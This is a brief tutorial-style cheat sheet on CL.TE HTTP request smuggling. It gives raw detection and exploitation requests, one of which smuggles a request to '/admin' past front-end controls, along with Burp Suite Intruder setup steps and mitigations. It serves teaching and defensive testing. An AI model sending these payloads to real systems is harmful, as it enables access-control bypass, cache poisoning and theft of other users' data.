# CL.TE Attack Example

## Scenario
Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`

## Basic Detection
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Send this request twice in quick succession. If the second request times out, the server is vulnerable.

## Exploitation: Bypassing Front-End Security

### Accessing Admin Panel
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

This smuggles a request to `/admin` that bypasses front-end security controls.

## Real-World Impact

- **Security Bypass**: Access restricted endpoints without authentication
- **Cache Poisoning**: Inject malicious responses into caches
- **Request Hijacking**: Steal sensitive data from other users

## Burp Suite Configuration

1. Send the request to **Intruder**
2. Set **Payload Position** to the entire request body
3. Load `CL-TE-Payloads.txt` as payload source
4. Configure **Grep - Match** for response indicators:
   - `404 Not Found`
   - `Access Denied`
   - `Admin Panel`

## Mitigation

- Disable HTTP/1.1 keep-alive connections
- Reject requests with both `Content-Length` and `Transfer-Encoding` headers
- Normalize requests at the front-end
- Use HTTP/2 end-to-end
